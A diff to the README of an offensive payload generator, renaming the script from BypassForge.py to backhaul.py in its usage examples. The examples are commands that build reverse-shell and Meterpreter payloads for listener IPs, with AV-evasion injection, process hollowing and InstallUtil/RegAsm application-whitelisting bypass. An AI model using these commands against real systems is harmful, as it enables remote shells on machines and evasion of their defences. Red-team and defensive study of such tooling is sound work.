@@ -45,7 +45,7 @@ The script can be used in two modes:
 
 Parameters like listener IP, listener port and MSF payload type are specified, based on which an MSFVenom payload is generated and embedded in the final binary.
 ```
-python BypassForge.py -b InstallUtil,RegAsm -lh 127.0.0.1 -lp 8080 --payload windows/x64/shell_reverse_tcp
+python backhaul.py -b InstallUtil,RegAsm -lh 127.0.0.1 -lp 8080 --payload windows/x64/shell_reverse_tcp
 ```
 ![image](https://github.com/user-attachments/assets/047de769-d90f-4350-b7c9-96ce3382d891)
 
@@ -54,19 +54,19 @@ python BypassForge.py -b InstallUtil,RegAsm -lh 127.0.0.1 -lp 8080 --payload win
 
 Custom shellcode created using 3rd party tools like micr0_shell (https://github.com/senzee1984/micr0_shell) or hand-crafted shellcode is supplied directly. The shellcode is embedded in the final payload binary.
 ```
-python BypassForge.py -b InstallUtil,RegAsm --custom --hex-shellcode 4831d265488b42604<SNIP>c9515151514989c84989c9ffd0
+python backhaul.py -b InstallUtil,RegAsm --custom --hex-shellcode 4831d265488b42604<SNIP>c9515151514989c84989c9ffd0
 ```
 ![image](https://github.com/user-attachments/assets/c60a0235-f614-4823-9fc9-606c4f5e59be)
 
 - **AV-evasion injection variants**
 ```
-python BypassForge.py -b NTMapInjection-AV -lh 192.168.1.10 -lp 443 --payload windows/x64/shell_reverse_tcp
-python BypassForge.py -b NativeProcInjection-AV -lh 192.168.1.10 -lp 443 --payload windows/x64/meterpreter/reverse_tcp
+python backhaul.py -b NTMapInjection-AV -lh 192.168.1.10 -lp 443 --payload windows/x64/shell_reverse_tcp
+python backhaul.py -b NativeProcInjection-AV -lh 192.168.1.10 -lp 443 --payload windows/x64/meterpreter/reverse_tcp
 ```
 
 - **Selecting an injection technique** (InstallUtil/RegAsm only)
 ```
-python BypassForge.py -b InstallUtil -t Process-Hollowing -lh 10.0.0.1 -lp 4444 --payload windows/x64/meterpreter/reverse_tcp
+python backhaul.py -b InstallUtil -t Process-Hollowing -lh 10.0.0.1 -lp 4444 --payload windows/x64/meterpreter/reverse_tcp
 ```
 
 ## Detection notes
